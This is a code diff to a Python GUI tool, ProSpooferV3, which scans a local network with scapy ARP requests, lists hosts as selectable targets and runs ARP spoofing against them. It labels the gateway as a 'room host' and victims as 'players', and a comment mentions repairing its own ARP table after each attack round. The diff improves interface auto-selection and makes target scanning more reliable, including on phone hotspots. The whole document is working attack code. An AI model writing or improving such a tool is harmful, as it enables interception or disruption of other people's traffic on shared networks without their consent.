@@ -5,9 +5,11 @@ from tkinter import messagebox
 
 import customtkinter as ctk
 # 注入 get_if_addr 和 conf 用于获取本机信息
-from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr
+from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr
 import ctypes.wintypes
 import subprocess
+import socket
+import re
 
 
 ctk.set_appearance_mode("dark")
@@ -36,17 +38,118 @@ class ProSpooferV3(ctk.CTk):
         self.is_running = False
         self.selected_targets = {}  # {ip: (checkbox_widget, var, mac)}
         self.gateway_mac = None
+        self.local_ip = "127.0.0.1"
 
-        # 获取本机 IP
-        try:
-            self.local_ip = get_if_addr(conf.iface)
-        except:
-            self.local_ip = "127.0.0.1"
+        # 先获取可用网卡列表
+        self.available_ifaces = self._get_available_ifaces()
+        # 自动选择最佳网卡
+        best_name, best_ip, best_mac = self._auto_select_best_iface()
+        self.current_iface = best_name
+        self.local_ip = best_ip
 
         self.setup_ui()
         self.auto_detect_gateway()  # 自动填充网关
         # 添加这一行：拦截点击窗口右上角“X”的事件
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
+
+    def _get_available_ifaces(self):
+        """获取系统中所有可用网卡列表，并自动选择有网络连接的那个"""
+        ifaces = []
+        try:
+            raw_list = get_if_list()
+            for name in raw_list:
+                try:
+                    ip = get_if_addr(name)
+                    mac = get_if_hwaddr(name)
+                    if ip and ip != "0.0.0.0" and mac:
+                        # 判断是否为回环地址
+                        is_loopback = ip.startswith("127.")
+                        ifaces.append((name, ip, mac, is_loopback))
+                except:
+                    pass
+        except:
+            pass
+
+        # 如果没找到，至少把 conf.iface 放进去
+        if not ifaces:
+            try:
+                name = str(conf.iface)
+                ip = get_if_addr(conf.iface)
+                mac = get_if_hwaddr(conf.iface)
+                ifaces.append((name, ip, mac, ip.startswith("127.")))
+            except:
+                ifaces.append((str(conf.iface), "0.0.0.0", "00:00:00:00:00:00", False))
+        return ifaces
+
+    def _auto_select_best_iface(self):
+        """自动选择最佳网卡（优先选有默认路由的、非回环的）"""
+        best = None
+        best_score = -1
+
+        for name, ip, mac, is_loop in self.available_ifaces:
+            score = 0
+            if not is_loop:
+                score += 10  # 非回环优先
+            if ip and ip != "0.0.0.0" and not ip.startswith("169.254"):
+                score += 5  # 有有效 IP
+            # 检查是否有默认路由
+            try:
+                route = conf.route.route("0.0.0.0")
+                if route and len(route) > 2:
+                    route_iface = route[0]
+                    if str(route_iface) == name:
+                        score += 20  # 有默认路由的网卡优先级最高
+            except:
+                pass
+            if score > best_score:
+                best_score = score
+                best = (name, ip, mac)
+
+        if best:
+            return best
+        # 兜底：返回第一个非回环的
+        for name, ip, mac, is_loop in self.available_ifaces:
+            if not is_loop:
+                return (name, ip, mac)
+        # 实在不行返回第一个
+        if self.available_ifaces:
+            n, i, m, _ = self.available_ifaces[0]
+            return (n, i, m)
+        return (str(conf.iface), "0.0.0.0", "00:00:00:00:00:00")
+
+    def _get_local_ip(self):
+        """获取本机 IP，多种方法兜底"""
+        # 方法1: 通过 scapy
+        try:
+            ip = get_if_addr(self.current_iface)
+            if ip and ip != "0.0.0.0":
+                return ip
+        except:
+            pass
+
+        # 方法2: 通过 socket 连接外部
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            if ip and ip != "0.0.0.0":
+                return ip
+        except:
+            pass
+
+        # 方法3: 通过 scapy route
+        try:
+            gw = conf.route.route("0.0.0.0")
+            if gw and len(gw) > 1:
+                ip = gw[1]
+                if ip and ip != "0.0.0.0":
+                    return ip
+        except:
+            pass
+
+        return "127.0.0.1"
 
     def repair_own_arp(self, gw_ip, gw_mac):
         """每轮攻击后修复本机 ARP 表，防止自身被污染"""
@@ -80,11 +183,10 @@ class ProSpooferV3(ctk.CTk):
 
         ctk.CTkLabel(self.sidebar, text="⚙️ 房间设置", font=("Arial", 14, "bold")).pack(pady=(15, 10))
 
-        default_iface = conf.iface.name if hasattr(conf.iface, 'name') else str(conf.iface)
-        self.iface_label = ctk.CTkLabel(self.sidebar, text=f"房间名: {default_iface[:15]}房间",
-                                        font=("Arial", 11), text_color="#3498db")
-        self.iface_label.pack(pady=2)
-        self.current_iface = conf.iface
+        # 显示本机 IP（自动识别，无需手动选择）
+        self.iface_label = ctk.CTkLabel(self.sidebar, text=f"🚪 房间ID: {self.local_ip}",
+                                        font=("Arial", 12, "bold"), text_color="#2ecc71")
+        self.iface_label.pack(pady=(5, 2))
 
         input_padx = 12
         ctk.CTkLabel(self.sidebar, text="房主:", font=("Arial", 11)).pack(anchor="w", padx=input_padx)
@@ -199,7 +301,20 @@ class ProSpooferV3(ctk.CTk):
     def do_scan(self):
         gw_ip = self.gateway_entry.get().strip()
         iface = self.current_iface
-        network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"
+
+        # 如果网关为空，尝试用本机 IP 推断网段
+        if not gw_ip or gw_ip == "0.0.0.0":
+            if self.local_ip and self.local_ip != "127.0.0.1":
+                network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
+                gw_ip = ".".join(self.local_ip.split('.')[:-1]) + ".1"
+                self.gateway_entry.delete(0, "end")
+                self.gateway_entry.insert(0, gw_ip)
+            else:
+                messagebox.showerror("扫描失败", "无法检测到网关 IP，请手动填写")
+                self.scan_btn.configure(state="normal", text="🔍 寻找玩家")
+                return
+        else:
+            network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"
 
         # 获取当前输入的白名单
         wl_ips = [i.strip() for i in self.whitelist_entry.get().replace(" ", "").split(",") if i]
@@ -207,20 +322,44 @@ class ProSpooferV3(ctk.CTk):
         wl_ips.append(self.local_ip)
 
         try:
+            self.status_label.configure(text="正在扫描网关...", text_color="#f39c12")
+            # 增加超时时间，手机热点可能响应慢
             ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
-                            timeout=1, iface=iface, verbose=False)
+                            timeout=3, iface=iface, verbose=False, retry=2)
             self.gateway_mac = ans_gw[0][1].hwsrc if ans_gw else None
 
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
-                         timeout=2, iface=iface, verbose=False)
+            if self.gateway_mac:
+                self.status_label.configure(text=f"网关已识别: {gw_ip} -> {self.gateway_mac}", text_color="#2ecc71")
+            else:
+                self.status_label.configure(text="网关未响应，尝试扫描网段...", text_color="#e67e22")
 
+            # 清空旧列表
             for widget in self.scroll_frame.winfo_children():
                 widget.destroy()
             self.selected_targets = {}
             self.all_widgets = {}
 
+            # 扫描整个网段 - 增加超时和重试
+            self.status_label.configure(text=f"正在扫描 {network} ...", text_color="#f39c12")
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
+                         timeout=5, iface=iface, verbose=False, retry=3)
+
+            # 如果没扫到任何设备，尝试用本机 IP 所在网段再扫一次（手机热点场景）
+            if len(ans) == 0 and self.local_ip != "127.0.0.1":
+                alt_network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
+                if alt_network != network:
+                    self.status_label.configure(text=f"尝试备用网段 {alt_network} ...", text_color="#f39c12")
+                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
+                                 timeout=5, iface=iface, verbose=False, retry=3)
+
+            # 处理扫描结果
+            found_ips = set()
             for _, rcv in ans:
                 ip, mac = rcv.psrc, rcv.hwsrc
+                if ip in found_ips:
+                    continue
+                found_ips.add(ip)
+
                 is_safe = ip in wl_ips or (self.gateway_mac and mac == self.gateway_mac) or ip == self.local_ip
 
                 var = ctk.BooleanVar(value=False)
@@ -249,7 +388,7 @@ class ProSpooferV3(ctk.CTk):
                 if not is_safe:
                     self.selected_targets[ip] = (cb, var, mac)
 
-            self.status_label.configure(text=f"扫描完毕: 发现 {len(ans)} 个玩家", text_color="#3498db")
+            self.status_label.configure(text=f"扫描完毕: 发现 {len(found_ips)} 个玩家", text_color="#3498db")
         except Exception as e:
             messagebox.showerror("扫描失败", f"请检查 Npcap 是否正常运行: {e}")
         finally:
